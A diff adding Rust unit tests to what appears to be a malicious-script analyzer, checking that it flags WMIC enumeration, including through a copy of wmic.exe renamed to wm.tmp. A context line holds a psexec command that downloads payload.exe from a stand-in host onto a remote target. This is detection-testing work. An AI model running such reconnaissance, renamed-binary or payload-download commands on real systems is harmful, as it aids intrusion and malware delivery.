@@ -4248,6 +4248,68 @@ C:\Users\Public\sp.tmp -Q */*
     }
 
     #[test]
+    fn additional_wmic_enumeration_classes_emit_traits() {
+        let report = analyze(
+            br#"wmic os get Caption
+wmic qfe get HotFixID
+wmic startup get Command
+"#,
+            &AnalyzeConfig::default(),
+        );
+
+        for needle in [
+            "wmic os get Caption",
+            "wmic qfe get HotFixID",
+            "wmic startup get Command",
+        ] {
+            assert!(
+                report.traits.iter().any(|t| matches!(
+                    t,
+                    Trait::Enumeration { enum_kind, command }
+                        if enum_kind == "wmic-enum" && command == needle
+                )),
+                "missing WMIC enumeration {needle}: {:?}",
+                report.traits
+            );
+        }
+    }
+
+    #[test]
+    fn copied_wmic_alias_additional_classes_emit_enumeration_traits() {
+        let script = br#"copy C:\Windows\System32\wbem\wmic.exe C:\Users\Public\wm.tmp
+C:\Users\Public\wm.tmp os get Caption
+C:\Users\Public\wm.tmp qfe get HotFixID
+C:\Users\Public\wm.tmp startup get Command
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ManipulatedExec { target, .. }
+                    if target.eq_ignore_ascii_case(r#"C:\Users\Public\wm.tmp"#)
+            )),
+            "copied WMIC alias was not surfaced: {:?}",
+            report.traits
+        );
+        for needle in [
+            "wmic.exe os get Caption",
+            "wmic.exe qfe get HotFixID",
+            "wmic.exe startup get Command",
+        ] {
+            assert!(
+                report.traits.iter().any(|t| matches!(
+                    t,
+                    Trait::Enumeration { enum_kind, command }
+                        if enum_kind == "wmic-enum" && command == needle
+                )),
+                "missing copied WMIC enumeration {needle}: {:?}",
+                report.traits
+            );
+        }
+    }
+
+    #[test]
     fn psexec_replays_remote_cmd_child() {
         let script = br#"psexec \\target.example -u admin -p pass cmd.exe /V:ON /c set U=https://psexec-wrapper.example/payload.exe&&curl -o payload.exe !U!"#;
         let report = analyze(script, &AnalyzeConfig::default());
